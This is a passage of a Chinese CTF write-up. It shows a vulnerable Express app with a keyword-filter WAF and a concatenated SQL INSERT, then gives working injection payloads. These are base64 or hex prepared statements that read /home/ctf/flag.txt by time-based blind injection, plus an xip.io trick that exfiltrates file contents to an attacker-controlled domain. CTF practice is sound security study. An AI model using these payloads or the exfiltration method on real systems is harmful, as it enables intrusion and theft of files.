    "sleep",
    "hex",
    "char",
    "db",
    "\\",
    "/",
    "*",
    "load_file",
    "0x",
    "fl",
    "ag",
    "txt",
    "if"
];

const waf = (str) =&gt; `{`
    for(const i in KEYWORDS)`{`
        const key = KEYWORDS[i];
        if(str.toLowerCase().indexOf(key) !== -1)`{`
            return true;
        `}`
    `}`
    return false;
`}`

const isValid = (ip) =&gt; `{`
    if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip))`{`
      return (true)
    `}`
  return (false)
`}`

const isPrivate = (ip) =&gt; `{`
    const parts = ip.split(".");
    return parts[0] === '10' || 
    (parts[0] === '172' &amp;&amp; (parseInt(parts[1], 10) &gt;= 16 &amp;&amp; parseInt(parts[1], 10) &lt;= 31)) || 
    (parts[0] === '192' &amp;&amp; parts[1] === '168');
`}`

const app = express();

app.use(express.static(__dirname + "/public"));
app.use(bodyParser.json());

app.post("/api/initializedb", function(req, res)`{`
    const body = req.body;
    if(body.hasOwnProperty("filename"))`{`
        if(!fs.readdirSync('db').includes(body.filename)) return res.status(400).send("File not found");
        try`{`
            const sql = fs.readFileSync("db/" + body.filename).toString();
            conn.query(sql, function(error, results, fields)`{`
                res.status(200).send("Success! Database has been intialized");
            `}`);
        `}` catch(err)`{`
            if(err.code = "EOENT")`{`
                res.status(400).send("File not found");
            `}`else`{`
                res.status(400).send("Bad request");
            `}`
        `}`
    `}`else`{`
        res.status(400).send("Bad request");
    `}`
`}`);

app.post("/api/registerproduct", function (req, res) `{`
    const body = req.body;
    if(body.hasOwnProperty("stockid") &amp;&amp; body.hasOwnProperty("name") &amp;&amp; body.hasOwnProperty("quantity") &amp;&amp; body.hasOwnProperty("vurl"))`{`
        if(!(waf(body.stockid) || waf(body.name) || waf(body.quantity) || waf(body.vurl)))`{`

            let query = "SELECT * FROM stock WHERE stockid = ? LIMIT 1";

            conn.query(query, [req.body.stockid], function(error, results, fields)`{`
                if (error)`{`
                    res.status(500).send("Internal server error");
                    return;
                `}`

                if(results.length &gt; 0)`{`
                    res.status(400).send("stockID already exists");
                    return;
                `}`else`{`
                    query = "INSERT INTO stock (stockid, name, quantity, vurl) VALUES (" + body.stockid + ", '" + body.name + "', " + body.quantity + ", '" + body.vurl + "');";

                    conn.query(query, function(error, results, fields)`{`
                        res.status(200).send("Success! Record was created");
                    `}`);
                `}`
            `}`);
        `}`else`{`
            res.status(403).send("Hacking attempt detected");
        `}`
    `}`else`{`
        res.status(400).send("Bad request");
    `}`
`}`);

app.post("/api/notifystock", function(req, res)`{`
    const body = req.body;
    if(body.hasOwnProperty("stockid"))`{`
        let query = "SELECT * FROM stock WHERE stockid = ? LIMIT 1";

        conn.query(query, [req.body.stockid], function(error, results, fields)`{`
            if (error)`{`
                res.status(500).send("Internal server error");
                return;
            `}`

            if(results.length &gt; 0)`{`
                if(results[0].quantity &gt; 0)`{`
                    res.status(400).send("Stock is not empty!");
                `}`else`{`
                    if(isValid(results[0].vurl.split("/")[0]) &amp;&amp; isPrivate(results[0].vurl.split("/")[0]))`{`
                        try `{`
                            request.get("http://" + results[0].vurl);
                        `}` catch(err)`{`
                            console.log("get request failed");
                        `}`
                        res.status(200).send("Thank you! The vendor has been notified");
                    `}`else`{`
                        let options = `{`
                            url: "https://dns.google.com/resolve?name=" + results[0].vurl.split("/")[0] + "&amp;type=A",
                            method: "GET",
                            headers: `{`
                                "Accept": "application/json"
                            `}`
                        `}`

                        request(options, function(err, dnsRes, body)`{`
                            let jsonRes;
                            try `{`
                                jsonRes = JSON.parse(body);
                            `}`catch(err)`{`
                                res.status(400).send("Bad request body");
                                return;
                            `}`
                            try `{`
                                const ip = jsonRes["Answer"][0]["data"];
                                if(isPrivate(ip))`{`
                                    try`{`
                                        request.get("http://" + results[0].vurl);
                                    `}` catch(err)`{`
                                        console.log("get request failed");
                                    `}`
                                    res.status(200).send("Thank you! The vendor has been notified");
                                `}`else`{`
                                    res.status(403).send("Thank you! But the address the vendor provided is improper, we will let them know next time we see them");
                                `}`
                            `}`catch(err)`{`
                                res.status(403).send("Thank you! But the address the vendor provided is improper, we will let them know next time we see them");
                            `}`
                        `}`)
                    `}`
                `}`
            `}`else`{`
                res.status(404).send("Stockid not found");
            `}`
        `}`);
    `}`else`{`
        res.status(400).send("Bad request");
    `}`
`}`);

app.listen(31337, () =&gt; `{`
    console.log("express listening on 31337");
`}`);
```

看过滤的KEYWORDS就大概可以猜出有注入，在insert那有注入，几个参数都可控，都是注册传入的参数。flag从给的源码压缩包中的dockerfile看是要`load_file`读`/home/ctf/flag.txt`，但是几个关键字都给过滤了。这里用预编译语句+16进制，或者用base64绕过这些过滤，有两种方法做接下来，一种外带回显，一种时间盲注。

先说简单的时间盲注

```
# (select if((select substr(load_file('/home/ctf/flag.txt'),1,1)) like binary 'f',sleep(6),1))

`{`"stockid":"2555","name":"aa","quantity":"0","vurl":"sf'); set @s=(select from_base64('c2VsZWN0IGlmKChzZWxlY3Qgc3Vic3RyKGxvYWRfZmlsZSgnL2hvbWUvY3RmL2ZsYWcudHh0JyksMSwxKSkgbGlrZSBiaW5hcnkgJ2YnLHNsZWVwKDYpLDEp'));PREPARE gsgs FROM @s;EXECUTE gsgs;#"`}`

`{`"stockid":"2560","name":"aa","quantity":"0","vurl":"sf'); set @s=(select x'73656c656374206966282873656c65637420737562737472286c6f61645f66696c6528272f686f6d652f6374662f666c61672e74787427292c312c312929206c696b652062696e617279202766272c736c6565702836292c3129');PREPARE gsgs FROM @s;EXECUTE gsgs;#"`}`
```

预期应该是外带，因为还有个路由可以访问vurl，但是有限制需要绕DNS，使得`https://dns.google.com/resolve?name=`{`vurl`}`&amp;type=A`查询出的结果能过`const isPrivate` ，即data为192.168开头。

利用[http://xip.io/](http://xip.io/)

www.192.168.1.1.xip.io会解析到192.168.1.1

nodejs中

request.get(‘[http://域名:www.192.168.1.1.xip.io](http://%E5%9F%9F%E5%90%8D:www.192.168.1.1.xip.io)‘) 会访问到域名，域名绑定到服务器，起个服务监听会显示访问记录

而且`https://dns.google.com/resolve?name=域名:www.192.168.1.1.xip.io&amp;type=A`显示的data为192.168.1.1满足条件

即要写入的`vurl`为

```
concat('域名:www.192.168.1.1.xip.io',LOAD_FILE('/home/ctf/ﬂag.txt'))
```

访问时就会带出flag,把下面语句base64或者16进制套到预编译语句里面，在访问`/api/notifystock`传入`{`“stockid”:”2333”`}`，服务器上应该有回显

```
INSERT INTO stock (stockid, name, quantity, vurl) VALUES (2333, 'aa', 22, concat('域名:www.192.168.1.1.xip.io',LOAD_FILE('/home/ctf/ﬂag.txt')));
```

参考: [https://ctftime.org/task/12160](https://ctftime.org/task/12160)
